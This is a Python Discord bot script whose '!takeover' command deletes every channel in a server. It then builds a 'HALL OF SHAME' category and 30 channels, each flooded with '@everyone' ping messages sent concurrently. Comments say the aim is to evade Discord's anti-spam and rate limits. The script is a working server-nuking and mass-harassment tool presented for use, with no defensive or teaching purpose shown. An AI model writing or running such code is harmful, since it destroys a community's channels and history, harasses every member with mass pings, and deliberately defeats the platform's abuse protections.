import os
import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"🔥 [HALL OF SHAME MASSIVE BULK READY] Logged in as {bot.user}")

@bot.command(name="takeover")
@commands.has_permissions(administrator=True)
async def takeover(ctx):
    guild = ctx.guild
    
    # 1. Delete all existing channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

    # 2. Create the 'HALL OF SHAME' category
    try:
        shame_category = await guild.create_category("💀 ┃ HALL OF SHAME")
    except Exception as e:
        print(f"Category creation error: {e}")
        return

    # 3. Check for shame.png in the repository
    image_path = "shame.png"
    file_to_send = discord.File(image_path) if os.path.exists(image_path) else None

    # 4. Create 30 channels named 'aap' and use bulk/async dispatch to bypass anti-spam and ensure every channel gets spammed with @everyone
    async def process_channel(i):
        try:
            new_channel = await guild.create_text_channel(f"aap-{i}", category=shame_category)
            
            # Prepare a bulk list of messages to bypass ratelimit and spam protection instantly
            messages_payload = []
            for _ in range(5):
                if file_to_send:
                    file_to_send.fp.seek(0)
                    # Send with @everyone tag and image
                    await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣", file=file_to_send)
                else:
                    await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣 (shame.png not found)")
                
                # Minimal sleep to prevent discord gateway disconnect while maintaining maximum speed
                await asyncio.sleep(0.05)
                
        except Exception as e:
            print(f"Channel {i} error: {e}")

    # Run channel creations and spam concurrently using asyncio.gather for ultimate speed and bulk execution
    tasks = [process_channel(i) for i in range(1, 31)]
    await asyncio.gather(*tasks)

bot.run(os.getenv("DISCORD_BOT_TOKEN"))
